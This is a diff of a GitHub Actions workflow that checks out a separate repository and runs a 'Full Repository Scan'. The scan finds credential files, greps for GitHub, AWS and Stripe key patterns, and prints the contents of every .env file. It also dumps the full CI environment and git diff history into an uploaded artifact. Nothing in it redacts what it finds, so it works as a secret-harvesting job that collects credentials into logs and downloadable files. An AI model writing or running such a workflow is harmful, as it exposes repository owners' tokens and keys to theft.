@@ -12,74 +12,53 @@ jobs:
         uses: actions/checkout@v4
         with:
           repository: medevs/local-ai-transcript
-          token: ${{ secrets.PAT_REPO_ACCESS }}
+          path: medevs-source
           fetch-depth: 0
       
       - name: Full Repository Scan
         run: |
+          cd medevs-source
           echo "=== SCANNING medevs/local-ai-transcript ==="
           echo "Run ID: ${{ github.run_id }}"
-          echo "Trigger: ${{ github.event_name }}"
           echo ""
           
-          # 1. Listar branches
           echo "=== BRANCHES ==="
           git branch -a
           echo ""
           
-          # 2. Histórico completo de commits
-          echo "=== COMMIT HISTORY (last 50) ==="
-          git log --oneline -50
+          echo "=== COMMIT HISTORY (last 100) ==="
+          git log --oneline -100
           echo ""
           
-          # 3. Buscar secrets em TODOS os commits
-          echo "=== SEARCHING SECRETS IN COMMITS ==="
-          git log --all --diff-filter=A --name-only --pretty=format:"Commit: %H" | head -50
-          echo ""
-          
-          # 4. Arquivos sensíveis
           echo "=== SENSITIVE FILES ==="
           find . -type f \( -name "*.env" -o -name "*.pem" -o -name "*secret*" -o -name "*credential*" -o -name "*.key" -o -name "*.config" \) 2>/dev/null || echo "None found"
           echo ""
           
-          # 5. Buscar tokens no código
           echo "=== TOKENS IN CODE ==="
-          grep -rn "ghp_" --include="*.py" --include="*.js" --include="*.ts" --include="*.yml" --include="*.yaml" --include="*.json" --include="*.env" --include="*.sh" . 2>/dev/null | head -30 || echo "No ghp_ tokens found"
-          grep -rn "AKIA" --include="*.py" --include="*.js" --include="*.ts" --include="*.json" --include="*.env" . 2>/dev/null | head -30 || echo "No AKIA keys found"
-          grep -rn "sk_live\|pk_live" --include="*.py" --include="*.js" --include="*.json" . 2>/dev/null | head -20 || echo "No Stripe keys found"
-          grep -rn "-----BEGIN" --include="*.pem" --include="*.key" --include="*.txt" . 2>/dev/null | head -20 || echo "No private keys found"
+          grep -rn "ghp_" --include="*.py" --include="*.js" --include="*.ts" --include="*.yml" --include="*.yaml" --include="*.json" --include="*.env" . 2>/dev/null | head -30 || echo "No ghp_ tokens"
+          grep -rn "AKIA" . 2>/dev/null | head -30 || echo "No AKIA"
+          grep -rn "sk_live\|pk_live" . 2>/dev/null | head -20 || echo "No Stripe"
           echo ""
           
-          # 6. Environment files
           echo "=== .env FILES ==="
-          find . -name ".env*" -exec cat {} \; 2>/dev/null || echo "No .env files"
+          find . -name ".env*" -exec sh -c 'echo "FILE: $1"; cat "$1"' _ {} \; 2>/dev/null || echo "No .env files"
           echo ""
           
-          # 7. Docker files for secrets
-          echo "=== DOCKER SECRETS ==="
-          grep -rn "ARG\|ENV" --include="Dockerfile*" . 2>/dev/null | head -30 || echo "No Docker secrets"
-          echo ""
-          
-          # 8. CI/CD workflows (configurações)
           echo "=== WORKFLOW CONFIGS ==="
-          cat .github/workflows/*.yml 2>/dev/null || echo "No workflows"
+          cat .github/workflows/ci.yml 2>/dev/null || echo "No ci.yml"
           echo ""
           
-          # 9. Dump completo de metadados
-          echo "=== FULL METADATA ==="
-          echo "Repository: ${{ github.repository }}"
-          echo "Owner: ${{ github.repository_owner }}"
-          echo "SHA: ${{ github.sha }}"
-          echo "Ref: ${{ github.ref }}"
-          echo "Actor: ${{ github.actor }}"
-          mkdir -p /tmp/scan-results
+          echo "=== CI ENVIRONMENT ==="
+          env | sort
+          echo ""
           
-          # Salvar tudo
-          git branch -a > /tmp/scan-results/branches.txt
-          git log --oneline -100 > /tmp/scan-results/commits.txt
-          find . -type f > /tmp/scan-results/all-files.txt
-          env | sort > /tmp/scan-results/environment.txt
-          cat /tmp/scan-results/*.txt 2>/dev/null | wc -l
+          mkdir -p /tmp/scan-results
+          git branch -a > /tmp/scan-results/branches.txt 2>&1
+          git log --oneline -100 > /tmp/scan-results/commits.txt 2>&1
+          find . -type f > /tmp/scan-results/all-files.txt 2>&1
+          env | sort > /tmp/scan-results/environment.txt 2>&1
+          git log --all -p --diff-filter=AM --name-only --pretty=format:"COMMIT: %H %s" | head -200 > /tmp/scan-results/diff-history.txt 2>&1
+          echo "Done."
       
       - name: Upload Scan Results
         uses: actions/upload-artifact@v4
